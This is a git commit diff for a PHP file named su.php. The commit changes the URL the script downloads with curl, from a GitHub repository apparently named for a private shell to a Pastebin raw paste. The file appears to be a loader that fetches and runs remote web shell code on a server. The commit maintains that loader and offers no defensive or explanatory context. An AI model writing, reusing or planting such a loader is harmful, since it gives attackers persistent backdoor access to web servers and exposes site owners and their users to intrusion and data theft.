01d9807e3f36d250ebb165a11f55c1cd7e9beb44
Botem7 <botemmm7@gmail.com>
2025-01-15 03:27:13 +0700

    Update su.php

--- su.php
+++ su.php
@@ -1,5 +1,5 @@
 <?php 
-$url = "https://raw.githubusercontent.com/zer04lone/shellpribadi/main/ganesh.php";
+$url = "https://pastebin.com/raw/w3rkFubE";
 $ch = curl_init($url); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
